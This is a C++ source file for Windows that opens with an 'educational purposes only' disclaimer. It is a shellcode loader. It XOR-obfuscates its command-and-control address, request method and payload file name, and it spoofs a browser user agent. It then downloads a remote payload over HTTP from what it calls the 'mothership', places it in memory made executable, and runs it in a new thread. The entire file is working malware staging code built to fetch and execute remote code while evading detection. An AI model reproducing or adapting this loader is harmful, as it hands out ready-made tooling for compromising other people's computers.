/*
 * Disclaimer:
 * This code was created for educational purposes only.
 * The author does not take responsibility for any misuse 
 * or unintended consequences arising from its application.
 * Users are encouraged to exercise caution and adhere to 
 * all relevant laws and regulations when utilizing this code.
 */

#include <iostream>
#include <string.h>
#include <stdio.h>
#include <Windows.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet.lib")

//Configuration for 192.168.1.1/sc.bin 
CHAR C2[] = { '0', ':', '1', ')', '0', '5', ';', ')', '0', '-', '2' };
CHAR SCfile[] = { '.', 'p', '`', ')', 'c', 'j', 'm' };
CHAR Method[] = "\"7&";
CHAR lpUaString[] = {'M', 'o', 'z', 'i', 'l', 'l', 'a', ' ', '/', ' ', '5', '.', '0', ' ', '(', 'W', 'i', 'n', 'd', 'o', 'w', 's', ' ', 'N', 'T', ' ', '1', '0', '.', '0', ';', ' ', 'W', 'i', 'n', '6', '4', ';', ' ', 'x', '6', '4', ')', ' ', 'A', 'p', 'p', 'l', 'e', 'W', 'e', 'b', 'K', 'i', 't', ' ', '/', ' ', '5', '3', '7', '.', '3', '6', ' ', '(', 'K', 'H', 'T', 'M', 'L', ',', ' ', 'l', 'i', 'k', 'e', ' ', 'G', 'e', 'c', 'k', 'o', ')', ' ', 'C', 'h', 'r', 'o', 'm', 'e', ' ', '/', ' ', '4', '2', '.', '0', '.', '2', '3', '1', '1', '.', '1', '3', '5', ' ', 'S', 'a', 'f', 'a', 'r', 'i', ' ', '/', ' ', '5', '3', '7', '.', '3', '6', ' ', 'E', 'd', 'g', 'e', ' ', '/', ' ', '1', '2', '.', '2', '4', '6'};
LPCWSTR CheckUrl = L"https://www.google.com";
CHAR key[] = {'e', 'r', 'r', 'o', 'r', ':', 'P', 'D', 'P', '_', 'D', 'E', 'T', 'E', 'C', 'T', 'E', 'D', '_', 'F', 'A', 'T', 'A', 'L', '_', 'E', 'R', 'R', 'O', 'R'};
CHAR key2[] = { 0x1, 0x3, 0x3, 0x7 };

//Globals
HINTERNET hInet = NULL;
HINTERNET hConn = NULL;
HINTERNET hReq = NULL;
LPCSTR headers = "Connection: keep-alive\r\n";
CHAR buffer[1024];
LPVOID pScBuff = NULL;

//XOR decrypt string
void XorEnc2(CHAR* EncStr2)
{
	int len = strlen(EncStr2);
	int i = 0;
	for (; i < len; i++)
	{
		EncStr2[i] = EncStr2[i] ^ key2[i % sizeof(key2)];
	}
}

//XOR decrypt string
void XorEnc(CHAR* EncStr)
{
	int i = 0;
	for (; i < strlen(EncStr); i++)
	{
		EncStr[i] = EncStr[i] ^ key[i % strlen(key)];
	}
}

//Download Shellcode
PCHAR GetNextStage()
{
	hInet = InternetOpenA(lpUaString, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	hConn = InternetConnectA(hInet, C2, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	//Decrypt Method and shellcode file name
	XorEnc(Method);
	XorEnc2(SCfile);
	hReq = HttpOpenRequestA(hConn, Method, SCfile, NULL, NULL, NULL, INTERNET_FLAG_PRAGMA_NOCACHE, 0);
	BOOL Hdrs = HttpAddRequestHeadersA(hReq, headers, -1, HTTP_ADDREQ_FLAG_ADD);
	if (!Hdrs)
	{
		std::cerr << "[x] Error adding headers" << std::endl;
	}
	BOOL Ret = HttpSendRequestA(hReq, NULL, NULL, NULL, 0);
	if (!Ret)
	{
		std::cerr << "[x] Connection to mothership failed." << std::endl;
	}
	else
		std::cout << "[+] Connection to mothership succeeded." << std::endl;
	
	DWORD dwNumberofBytesRead = 0;
	BOOL Read = InternetReadFile(hReq, buffer, sizeof(buffer), &dwNumberofBytesRead);
	if (!Read)
	{
		std::cerr << "[x] Could not obtain shellcode." << std::endl;
	}

	InternetCloseHandle(hInet);
	InternetCloseHandle(hConn);
	InternetCloseHandle(hReq);

	return buffer;
}

int main()
{
	XorEnc2(C2);
	std::cout << "Downloading payload from: " << C2 << std::endl;

	CHAR* sc = GetNextStage();
	if (sc == NULL)
	{
		std::cerr << "[x] Shellcode could not be retrieved." << std::endl;
	}

	pScBuff = VirtualAlloc(NULL, sizeof(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!pScBuff)
	{
		std::cerr << "[x] Error in memory alloction." << std::endl;
		free(pScBuff);
	}
	RtlMoveMemory(pScBuff, sc, sizeof(buffer));
	DWORD OldProtect = 0;
	BOOL MemProtect = VirtualProtect(pScBuff, sizeof(buffer), PAGE_EXECUTE_READ, &OldProtect);
	if (!MemProtect)
	{
		std::cerr << "[x] Error modifying permission in memory page." << std::endl;
		free(pScBuff);
	}

	//Run shellcode from executable memory
	HANDLE hScThread = NULL;
	hScThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pScBuff, NULL, 0, NULL);
	if (hScThread == NULL)
	{
		std::cerr << "[x] Error in thread creation." << std::endl;
	}
	DWORD wait = WaitForSingleObject(hScThread, INFINITE);
	CloseHandle(hScThread);

	return 0;
}
